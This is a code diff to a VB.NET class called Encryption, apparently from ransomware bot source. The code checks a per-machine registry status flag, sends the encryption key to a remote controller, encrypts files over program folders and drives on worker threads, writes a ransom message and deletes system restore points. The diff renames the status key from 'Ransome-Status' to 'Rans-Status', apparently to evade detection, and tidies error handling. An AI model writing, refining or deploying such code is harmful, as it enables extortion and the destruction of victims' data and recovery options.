@@ -94,13 +94,9 @@ Public Class Encryption
     Public Sub startAction()
         Try
 
-            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", Nothing)
+            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", Nothing)
             If readValue = "Encrypted" Or readValue = "Encryption in progress..." Or readValue = "Decryption in progress..." Then
-                Try
-                    Main.C.Close()
-                    Main.C = Nothing
-                Catch ex As Exception
-                End Try
+                Main.CloseMe()
                 Exit Sub
             End If
 
@@ -108,7 +104,7 @@ Public Class Encryption
             Threading.Thread.CurrentThread.Sleep(1000)
             Main.Send("Key" + SPL + ID.Bot + SPL + password)
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Encryption in progress...")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", "Encryption in progress...")
 
             Dim T1 As New Threading.Thread(AddressOf Progfiles)
             Dim T2 As New Threading.Thread(AddressOf Fix_Drivers)
@@ -125,16 +121,14 @@ Public Class Encryption
             messageCreator()
             password = Nothing
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Encrypted")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", "Encrypted")
 
             SC()
 
             DeleteRestorePoints()
 
-            Try
-                Main.CloseMe()
-            Catch ex As Exception
-            End Try
+            Main.CloseMe()
+
         Catch ex As Exception
         End Try
 
